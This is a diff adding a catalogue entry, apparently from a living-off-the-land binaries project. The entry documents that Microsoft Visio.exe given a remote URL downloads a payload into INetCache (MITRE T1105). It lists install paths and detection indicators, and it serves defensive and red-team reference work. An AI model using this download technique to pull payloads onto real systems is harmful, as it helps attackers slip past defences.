@@ -1,0 +1,34 @@
+---
+Name: Visio.exe
+Description: Microsoft Visio Executable
+Author: Avihay Eldad
+Created: 2024-02-15
+Commands:
+  - Command: Visio.exe {REMOTEURL}
+    Description: Downloads payload from remote server
+    Usecase: It will download a remote payload and place it in INetCache.
+    Category: Download
+    Privileges: User
+    MitreID: T1105
+    OperatingSystem: Windows
+    Tags:
+      - Download: INetCache
+Full_Path:
+  - Path: C:\Program Files (x86)\Microsoft Office\Office14\Visio.exe
+  - Path: C:\Program Files\Microsoft Office\Office14\Visio.exe
+  - Path: C:\Program Files (x86)\Microsoft Office\Office15\Visio.exe
+  - Path: C:\Program Files\Microsoft Office\Office15\Visio.exe
+  - Path: C:\Program Files (x86)\Microsoft Office\Office16\Visio.exe
+  - Path: C:\Program Files\Microsoft Office\Office16\Visio.exe
+  - Path: C:\Program Files (x86)\Microsoft Office\root\Office14\Visio.exe
+  - Path: C:\Program Files\Microsoft Office\root\Office14\Visio.exe
+  - Path: C:\Program Files (x86)\Microsoft Office\root\Office15\Visio.exe
+  - Path: C:\Program Files\Microsoft Office\root\Office15\Visio.exe
+  - Path: C:\Program Files (x86)\Microsoft Office\root\Office16\Visio.exe
+  - Path: C:\Program Files\Microsoft Office\root\Office16\Visio.exe
+Detection:
+  - IOC: URL on a visio.exe command line
+  - IOC: visio.exe making unexpected network connections or DNS requests
+Acknowledgement:
+  - Person: Avihay Eldad
+    Handle: '@AvihayEldad'
